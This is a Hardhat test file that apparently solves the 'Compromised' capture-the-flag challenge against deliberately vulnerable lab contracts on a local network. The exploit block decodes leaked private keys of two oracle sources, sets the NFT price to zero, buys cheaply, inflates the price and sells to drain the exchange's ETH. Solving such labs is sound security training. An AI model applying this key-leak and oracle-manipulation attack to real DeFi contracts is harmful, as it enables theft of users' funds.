const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const key1 = `4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535`;
        const key2 = `4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134`;
        const b641 = Buffer.from(key1,'hex').toString('utf8');
        const b642 = Buffer.from(key2,'hex').toString('utf8');
        const hex1 = Buffer.from(b641,'base64').toString('utf8');
        const hex2 = Buffer.from(b642,'base64').toString('utf8');
        //const acc1 = web3.eth.accounts.privateKeyToAccount(hex1);
        //const acc2 = web3.eth.accounts.privateKeyToAccount(hex2);
        var wallet1 = new ethers.Wallet(hex1, ethers.provider);
        var wallet2 = new ethers.Wallet(hex2, ethers.provider);
        console.log('test',wallet1.address,wallet2.address);
        const accounts = await ethers.getSigners();
        //await wallet1.connect(ethers.provider);
        await this.oracle.connect(wallet1).postPrice('DVNFT', 0);
        await this.oracle.connect(wallet2).postPrice('DVNFT', 0);
        let price = await this.oracle.getMedianPrice('DVNFT');
        console.log('Price1: ',price.toString());
        const tx = await this.exchange.connect(attacker).buyOne({value:1});
        //console.log('tx',tx);
        await this.oracle.connect(wallet1).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
        await this.oracle.connect(wallet2).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
        price = await this.oracle.getMedianPrice('DVNFT');
        console.log('Price2: ',price.toString());
        await this.nftToken.connect(attacker).approve(this.exchange.address,0);
        await this.exchange.connect(attacker).sellOne(0);
        await this.oracle.connect(wallet1).postPrice('DVNFT', INITIAL_NFT_PRICE);
        await this.oracle.connect(wallet2).postPrice('DVNFT', INITIAL_NFT_PRICE);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
